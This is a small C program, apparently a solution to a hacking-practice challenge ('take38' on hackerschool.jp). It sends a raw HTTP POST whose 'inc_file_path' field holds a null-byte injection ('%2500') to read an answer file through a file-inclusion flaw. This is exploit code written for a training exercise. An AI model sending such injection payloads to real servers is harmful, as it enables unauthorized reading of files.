#ifdef __linux__
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <netdb.h>

int sread(void *s,char *p,int l){return recv(*(int*)s,p,l,0);}
int swrite(void *s,const char *p,int l){return send(*(int*)s,p,l,0);}
int sclose(void *s){return close(*(int*)s);}
char* myfgets(char *b,int n,FILE *f){
	char *r=fgets(b,n,f);
	if(!r)return NULL;
	if(b[strlen(b)-1]=='\n')b[strlen(b)-1]=0;
	if(b[strlen(b)-1]=='\r')b[strlen(b)-1]=0;
	return r;
}
#ifdef __linux__
FILE *funopen(void *cookie,cookie_read_function_t *R,cookie_write_function_t *W,cookie_seek_function_t *S,cookie_close_function_t *C){
	if(!R&&!W)return NULL;
	cookie_io_functions_t io={R,W,S,C};
	return fopencookie(cookie,R&&W?"r+b":R?"rb":"wb",io);
}
#endif
char z[9999];
int main(){
	struct hostent *host = gethostbyname("www.hackerschool.jp");
	unsigned short port = 80;
	int sock;
	struct sockaddr_in addr;

	memset(&addr, 0, sizeof(addr));
	addr.sin_port = htons(port);
	addr.sin_family = host->h_addrtype;
	addr.sin_addr.s_addr = *((in_addr_t*)host->h_addr_list[0]);
	sock = socket(host->h_addrtype, SOCK_STREAM, 0);
	connect(sock, (struct sockaddr *) &addr, sizeof(addr));

	FILE *f=funopen(&sock,sread,swrite,NULL,sclose);
	fputs("POST /hack/ajax_take38.php HTTP/1.1\r\n",f);
	fputs("Host: www.hackerschool.jp\r\n",f);
	fputs("Connection: close\r\n",f);
	fputs("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",f);
	fprintf(f,"Content-Length: %d\r\n",strlen("inc_file_path=take38_answer.php%2500"));
	fputs("\r\n",f);
	fputs("inc_file_path=take38_answer.php%2500",f); //escape("%00")
	while(myfgets(z,9999,f)&&*z);//puts(z); //strip header
	while(myfgets(z,9999,f))puts(z);
	fclose(f);
}